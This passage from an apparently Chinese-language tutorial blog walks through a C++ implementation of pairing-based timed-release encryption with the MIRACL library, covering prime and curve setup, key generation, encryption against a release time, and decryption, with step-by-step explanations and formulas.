<span class="hljs-comment">//    q=pow((Big)2,160)-pow((Big)2,76)-1;</span><br><br>    cout &lt;&lt; <span class="hljs-string">&quot;q= &quot;</span> &lt;&lt; q &lt;&lt; endl;<br>    <span class="hljs-comment">//int logq=bits(q);//计算q的二进制位数，这里是160</span><br><span class="hljs-comment">//cout &lt;&lt; &quot;log q= &quot; &lt;&lt; logq &lt;&lt; endl;</span><br><br><span class="hljs-comment">/*--------------------------------------------------------------产生素数p-------------------------------------------------------------------------*/</span><br><span class="hljs-comment">//generate p</span><br>    t = (<span class="hljs-built_in">pow</span>((Big)<span class="hljs-number">2</span>, PBITS) - <span class="hljs-number">1</span>) / (<span class="hljs-number">2</span> * q);<br>    a = (<span class="hljs-built_in">pow</span>((Big)<span class="hljs-number">2</span>, PBITS - <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>) / (<span class="hljs-number">2</span> * q);<br>    forever<br>    &#123;<br>        n = <span class="hljs-built_in">rand</span>(t);<br>        <span class="hljs-keyword">if</span> (n &lt; a) <span class="hljs-keyword">continue</span>;<br>        p = <span class="hljs-number">2</span> * n * q - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (p % <span class="hljs-number">24</span> != <span class="hljs-number">11</span>) <span class="hljs-keyword">continue</span>;  <span class="hljs-comment">// must be 2 mod 3, also 3 mod 8</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">prime</span>(p)) <span class="hljs-keyword">break</span>;<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-string">&quot;p= &quot;</span> &lt;&lt; p &lt;&lt; endl;<br><br>    cof = <span class="hljs-number">2</span> * n;<br><br>    <span class="hljs-built_in">ecurve</span>(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, p, MR_PROJECTIVE);    <span class="hljs-comment">// elliptic curve y^2=x^3+1 mod p</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Find suitable cube root of unity (solution in Fp2 of x^3=1 mod p)</span><br><span class="hljs-comment">//    </span><br>    forever<br>    &#123;<br>        <span class="hljs-comment">//    cube=pow(randn2(),(p+1)*(p-1)/3);</span><br>            cube = <span class="hljs-built_in">pow</span>(<span class="hljs-built_in">randn2</span>(),(p + <span class="hljs-number">1</span>) / <span class="hljs-number">3</span>);<br>            cube = <span class="hljs-built_in">pow</span>(cube,p - <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> (!cube.<span class="hljs-built_in">isunity</span>()) <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    cout &lt;&lt; <span class="hljs-string">&quot;Cube root of unity= &quot;</span> &lt;&lt; cube &lt;&lt; endl;<br><br>    <span class="hljs-keyword">if</span> (!(cube * cube * cube).<span class="hljs-built_in">isunity</span>())<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;sanity check failed&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// Choosing an arbitrary P ....</span><br>    <span class="hljs-comment">/*-------------------------------------------------------------产生椭圆曲线上任意点P（生成元）-------------------------------------------------------------------------*/</span><br>    forever<br>    &#123;<br>        <span class="hljs-keyword">while</span> (!P.<span class="hljs-built_in">set</span>(<span class="hljs-built_in">randn</span>()));<br>        P *= cof;<br>        <span class="hljs-keyword">if</span> (!P.<span class="hljs-built_in">iszero</span>()) <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>        <span class="hljs-comment">// cout &lt;&lt; &quot;Point P= &quot; &lt;&lt; P &lt;&lt; endl; //</span><br>    cout &lt;&lt; <span class="hljs-string">&quot;生成元P=&quot;</span> &lt;&lt; P &lt;&lt; endl;<br><br>    <span class="hljs-comment">/*-------------------------------------------------------------产生椭圆曲线上任意点Q-------------------------------------------------------------------------*/</span><br>    forever<br>    &#123;<br>        <span class="hljs-keyword">while</span> (!Q.<span class="hljs-built_in">set</span>(<span class="hljs-built_in">randn</span>()));<br>        Q *= cof;<br>        <span class="hljs-keyword">if</span> (!Q.<span class="hljs-built_in">iszero</span>()) <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    cout &lt;&lt; <span class="hljs-string">&quot;Point Q= &quot;</span> &lt;&lt; Q &lt;&lt; endl; <span class="hljs-comment">//</span><br>    <br>    <span class="hljs-comment">//时间服务器计算公钥</span><br>    Big s = <span class="hljs-built_in">rand</span>(q);<br>    ECn ts_pub = s * P;<br>    cout &lt;&lt; <span class="hljs-string">&quot;ts_pub=&quot;</span> &lt;&lt; ts_pub &lt;&lt; endl;<br>    <span class="hljs-comment">//接收方计算公钥私钥</span><br>    Big u = <span class="hljs-built_in">rand</span>(q);<br>    Big usk = u;<br>    cout &lt;&lt; <span class="hljs-string">&quot;usk=&quot;</span> &lt;&lt; usk &lt;&lt; endl;<br>    ECn upk = u * P;<br>    <span class="hljs-comment">//发送方计算密文</span><br>    Big r = <span class="hljs-built_in">rand</span>(q);<br>    ECn U = r * P;<br><br>    <span class="hljs-type">char</span> T[<span class="hljs-number">100</span>] = <span class="hljs-string">&quot;2023-09-21-21-13&quot;</span>;<br>    <span class="hljs-comment">//计算k</span><br>    ECn RT = r * <span class="hljs-built_in">map_to_point</span>(T, cof);<br>    ECn <span class="hljs-type">u_t</span> = upk + ts_pub;<br>    ZZn2 k;<br>    <span class="hljs-built_in">ecap</span>(RT, <span class="hljs-type">u_t</span>, q, cube, k);<br>    cout &lt;&lt; <span class="hljs-string">&quot;k=&quot;</span> &lt;&lt; k &lt;&lt; endl;<br>    <span class="hljs-comment">//计算V</span><br>    <span class="hljs-type">char</span> M[<span class="hljs-number">20</span>] = <span class="hljs-string">&quot;abcdefghijklmn&quot;</span>; <span class="hljs-comment">//明文</span><br>    cout &lt;&lt; <span class="hljs-string">&quot;M:&quot;</span> &lt;&lt; M &lt;&lt; endl;<br>    <span class="hljs-type">char</span> c2[<span class="hljs-number">81</span>] = <span class="hljs-string">&quot;\0&quot;</span>;<br>    <span class="hljs-type">char</span> V[<span class="hljs-number">81</span>] = <span class="hljs-string">&quot;\0&quot;</span>;<br>    <span class="hljs-type">int</span> len = <span class="hljs-built_in">H2</span>(k, c2);<br>    cout &lt;&lt; <span class="hljs-string">&quot;c2=&quot;</span> &lt;&lt; c2 &lt;&lt; endl;<br>    <span class="hljs-built_in">xorStrings</span>(c2, M, V, <span class="hljs-number">20</span>);<br>    cout &lt;&lt; <span class="hljs-string">&quot;V=&quot;</span> &lt;&lt; V &lt;&lt; endl;<br><br>    <span class="hljs-comment">//时间服务器计算时间陷门SH1(T)</span><br>    ECn ST = s * <span class="hljs-built_in">map_to_point</span>(T, cof);<br>    <span class="hljs-comment">//接收方计算UT,K&#x27;，计算M</span><br>    ECn UT = usk * <span class="hljs-built_in">map_to_point</span>(T, cof);<br>    ZZn2 k_;<br>    ECn SU = ST + UT;<br>    <span class="hljs-built_in">ecap</span>(SU, U, q, cube, k_);<br>    cout &lt;&lt; <span class="hljs-string">&quot;k&#x27;=&quot;</span> &lt;&lt; k_ &lt;&lt; endl;<br><br>    <span class="hljs-type">char</span> m1[<span class="hljs-number">31</span>] = <span class="hljs-string">&quot;\0&quot;</span>;<br>    len = <span class="hljs-built_in">H2</span>(k_, m1);<br>    cout &lt;&lt; len &lt;&lt; endl;<br>    cout &lt;&lt; m1 &lt;&lt; endl;<br>    <span class="hljs-type">char</span> m[<span class="hljs-number">21</span>] = <span class="hljs-string">&quot;\0&quot;</span>;<br>    <span class="hljs-built_in">xorStrings</span>(V, m1, m, <span class="hljs-number">20</span>);<br>    cout &lt;&lt; <span class="hljs-string">&quot;M=&quot;</span> &lt;&lt; m;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="关于main函数的具体分析">关于main函数的具体分析</h2><p>相关运算函数都已经写好，只需要按步骤执行即可</p><h3 id="初始化-2">初始化</h3><ul><li>首先生成素数阶<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>，随后生成<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>，确定椭圆曲线域，随后产生椭圆曲线生成元<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></li></ul><h3 id="加密解密过程">加密解密过程</h3><ul><li><p>随后时间服务器部分根据步骤产生随机数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span>做为私钥，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mo>⋅</mo><mi>P</mi></mrow><annotation encoding="application/x-tex">s\cdot P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4445em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span>作为公钥</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//时间服务器计算公钥</span><br>Big s = <span class="hljs-built_in">rand</span>(q);<br>ECn ts_pub = s * P;<br>cout &lt;&lt; <span class="hljs-string">&quot;ts_pub=&quot;</span> &lt;&lt; ts_pub &lt;&lt; endl;<br></code></pre></td></tr></table></figure></li><li><p>接收方选取随机数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi></mrow><annotation encoding="application/x-tex">u</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">u</span></span></span></span>作为私钥，计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi><mo>⋅</mo><mi>P</mi></mrow><annotation encoding="application/x-tex">u\cdot P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4445em;"></span><span class="mord mathnormal">u</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span>作为公钥</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"> <span class="hljs-comment">//接收方计算公钥私钥</span><br>Big u = <span class="hljs-built_in">rand</span>(q);<br>Big usk = u;<br>cout &lt;&lt; <span class="hljs-string">&quot;usk=&quot;</span> &lt;&lt; usk &lt;&lt; endl;<br>ECn upk = u * P;<br></code></pre></td></tr></table></figure></li><li><p>发送方发送的消息为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>，选取随机数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span>计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi><mo>=</mo><mi>r</mi><mo>∗</mo><mi>P</mi></mrow><annotation encoding="application/x-tex">U=r*P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4653em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"> <span class="hljs-comment">//发送方计算</span><br>Big r = <span class="hljs-built_in">rand</span>(q);<br>ECn U = r * P;<br></code></pre></td></tr></table></figure></li><li><p>计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mo>=</mo><mi>e</mi><mo stretchy="false">(</mo><mi>r</mi><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>u</mi><mi>P</mi><mo>+</mo><mi>s</mi><mi>P</mi><mo stretchy="false">)</mo><mo>=</mo><mi>e</mi><mo stretchy="false">(</mo><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>P</mi><msup><mo stretchy="false">)</mo><mrow><mi>r</mi><mo stretchy="false">(</mo><mi>u</mi><mo>+</mo><mi>s</mi><mo stretchy="false">)</mo></mrow></msup></mrow><annotation encoding="application/x-tex">K=e(rH_1(T),uP+sP)=e(H_1(T),P)^{r(u+s)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.138em;vertical-align:-0.25em;"></span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">u</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight">s</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span></span>，其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo stretchy="false">(</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e()</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mclose">)</span></span></span></span>为双线性对运算，也就是函数ecap</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//选定时间T</span><br><span class="hljs-type">char</span> T[<span class="hljs-number">100</span>] = <span class="hljs-string">&quot;2023-09-21-21-13&quot;</span>;<br><span class="hljs-comment">//计算k</span><br><span class="hljs-comment">//计算rH1(T)</span><br>ECn RT = r * <span class="hljs-built_in">map_to_point</span>(T, cof);<br><span class="hljs-comment">//计算uP+sP</span><br>ECn <span class="hljs-type">u_t</span> = upk + ts_pub;<br>ZZn2 k;<br><span class="hljs-built_in">ecap</span>(RT, <span class="hljs-type">u_t</span>, q, cube, k);<br>cout &lt;&lt; <span class="hljs-string">&quot;k=&quot;</span> &lt;&lt; k &lt;&lt; endl;<br></code></pre></td></tr></table></figure></li><li><p>密文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo>=</mo><mo>&lt;</mo><mi>U</mi><mo separator="true">,</mo><mi>V</mi><mo>&gt;</mo><mo>=</mo><mo>&lt;</mo><mi>r</mi><mi>P</mi><mo separator="true">,</mo><mi>M</mi><mo>⊕</mo><msub><mi>H</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>K</mi><mo stretchy="false">)</mo><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">C=&lt;U,V&gt;=&lt;rP,M\oplus H_2(K)&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;=&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span></span></span></span></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//计算V</span><br><span class="hljs-type">char</span> M[<span class="hljs-number">20</span>] = <span class="hljs-string">&quot;abcdefghijklmn&quot;</span>;<br>cout &lt;&lt; <span class="hljs-string">&quot;M:&quot;</span> &lt;&lt; M &lt;&lt; endl;<br><span class="hljs-type">char</span> c2[<span class="hljs-number">81</span>] = <span class="hljs-string">&quot;\0&quot;</span>,V[<span class="hljs-number">81</span>] = <span class="hljs-string">&quot;\0&quot;</span>;<br><span class="hljs-comment">//c2为H2(K)</span><br><span class="hljs-type">int</span> len = <span class="hljs-built_in">H2</span>(k, c2);<br>cout &lt;&lt; <span class="hljs-string">&quot;c2=&quot;</span> &lt;&lt; c2 &lt;&lt; endl;<br><span class="hljs-comment">//异或</span><br><span class="hljs-built_in">xorStrings</span>(c2, M, V, <span class="hljs-number">20</span>);<br>cout &lt;&lt; <span class="hljs-string">&quot;V=&quot;</span> &lt;&lt; V &lt;&lt; endl;<br></code></pre></td></tr></table></figure></li><li><p>在解密时间<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span>时时间服务器计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>T</mi></msub><mo>=</mo><mi>t</mi><msub><mi>s</mi><mrow><mi>p</mi><mi>r</mi><mi>i</mi><mi>v</mi></mrow></msub><mo>⋅</mo><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo>=</mo><mi>s</mi><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S_T=ts_{priv}\cdot H_1(T)=sH_1(T)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9012em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span></span></span></span>，其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">H_1()</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mclose">)</span></span></span></span>为函数map_to_point，并将此消息广播</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//时间服务器计算时间陷门SH1(T)</span><br>ECn ST = s * <span class="hljs-built_in">map_to_point</span>(T, cof);<br></code></pre></td></tr></table></figure></li><li><p>接收方收到广播<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>T</mi></msub></mrow><annotation encoding="application/x-tex">S_T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>并计算<span class="katex"><span class="katex-mathml"><math 